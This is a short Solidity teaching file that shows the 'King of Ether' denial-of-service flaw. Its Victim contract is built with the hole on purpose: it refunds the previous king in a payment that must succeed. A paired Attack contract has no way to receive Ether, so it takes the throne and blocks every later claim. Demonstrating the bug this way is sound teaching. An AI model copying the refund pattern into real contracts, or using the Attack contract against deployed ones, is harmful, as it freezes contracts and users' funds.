//SPDX-License-Identifier: MIT
// Author: Yaghoub Adelzadeh
// GitHub: https://www.github.com/dappteacher
pragma solidity ^0.8.25;

contract Victim{
    address public king;
    uint256 public balance;

    function claimThrone()public payable {
        require(msg.value > balance,"Need to pay more to become the king!");

        // We withdraw all money for the current king with the below code
        (bool sent,) = king.call{ value : balance}("");
        require(sent,"Failed to send Ether");

        // Update the balance with the new amount sent by the new king
        balance = msg.value;

        // Update the king to the new claimant
        king = msg.sender;
    }
}
// The Attack contract doesn't have a receive or fallback function, so
// it can't accept receiving money. This will cause the transaction to fail
// if the Victim contract attempts to send Ether to this contract.
contract Attack{
    Victim victim;
    // Initialize the Attack contract with the address of the Victim contract
    constructor(Victim _victim){
        victim = Victim(_victim);
    }
    // The attack function forwards Ether to the claimThrone function
    // of the Victim contract to claim the throne
    function attack()public payable {
        victim.claimThrone{value: msg.value}();
    }
}
